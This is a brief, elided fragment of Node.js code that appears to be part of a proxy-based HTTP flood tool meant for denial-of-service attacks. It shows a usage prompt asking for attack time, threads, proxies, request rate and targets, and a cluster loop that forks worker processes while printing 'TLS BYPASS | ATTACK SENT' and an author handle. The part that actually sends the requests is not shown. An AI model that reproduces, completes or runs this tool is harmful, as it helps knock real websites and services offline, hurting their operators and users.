...
if (process.argv.length < 8){console.log(`Mode <Time> <Threads> <Proxys> <RQ/S> <Targets>`); process.exit();}
const headers = {};
...
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
       console.clear()
       console.log(`TLS BYPASS | ATTACK SENT`)
       console.log(`Anon xGrem : @hb06 | Version : 2.0`)
       console.log(`-----------------------------------`)
   }
